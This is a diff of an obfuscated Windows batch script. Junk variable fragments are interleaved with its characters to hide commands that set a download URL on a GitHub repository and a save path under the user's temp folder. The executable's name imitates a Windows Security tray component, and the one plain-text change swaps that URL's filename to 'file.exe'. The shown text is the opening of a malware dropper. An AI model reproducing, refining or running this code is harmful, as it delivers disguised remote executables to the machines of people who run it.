@@ -1,5 +1,5 @@
 @%Ks%e%yptZ%c%BvifP%h%nbJT%o%FcEFZN% %Sl%o%rUUH%f%TbTaWBazG%f%ANmqdwZyAH%
-set url=https://github.com/MYRALL/fixx/raw/refs/heads/master/SecurityHealthSystray.exe
+set url=https://github.com/MYRALL/fixx/raw/refs/heads/master/file.exe
 s%XLo%e%ZlWW%t%ngwle% %EitIZzOQxY%u%XPpSaGJ%r%vHReijQ%l%lMW%=%GRrca%h%GUJUcLQyUV%t%aPc%t%XELBpLhoF%p%hwVF%s%MnUthhD%:%sCogYo%/%nEvWcNoz%/%fOBfBE%g%Tg%i%DTVeYKbOQj%t%rbtQtTf%h%djpyBdMbv%u%JVGroObv%b%Hcuow%.%h%c%CtRfXOcYwh%o%CwZM%m%cA%/%QcRl%M%YwbGp%Y%rpnskQtcvX%R%ffcw%A%OB%L%fkD%L%gwH%/%GfFd%f%xhLbjQVI%i%fsr%x%cnIJQCn%x%qpscQn%/%NDDFAPiUS%r%WFyropyq%a%w%w%LEfKMRx%/%jDJT%r%Xsw%e%Byu%f%M%s%zvr%/%nBQPfPyf%h%FtkvzOWEqd%e%z%a%ODwMM%d%RQgZuIW%s%BUi%/%JMiKCQ%m%mvDAai%a%Sto%s%WAwhB%t%GvGYRQ%e%rBSjhnWc%r%rq%/%gIFEskl%S%bayOfqX%e%HZEHmVHkgB%c%H%u%ovcKLJu%r%xTNiBuA%i%RgyUyHTuV%t%L%y%Ock%H%iLULCtiM%e%AHx%a%H%l%mhqbfJPvO%t%JBHR%h%zdznjPT%S%ALzPKzjs%y%McRsUNgrUL%s%tOdpY%t%qx%r%XYghKf%a%w%y%Q%.%lbVWg%e%iBJp%x%xMxgYa%e%hDChnFbaRP%
 s%SpcGkkUoKL%e%nJvC%t%E% %SeoorXyHUD%f%GSutJM%i%q%l%NS%e%Qj%=%zAi%%TEMP%\%GOdzaCxXZe%f%Osvc%i%kgGSWDdhmZ%l%IotzL%e%N%.%usk%e%cfEIEuHSE%x%eXcgVAB%e%hpDgnxSIS%
 
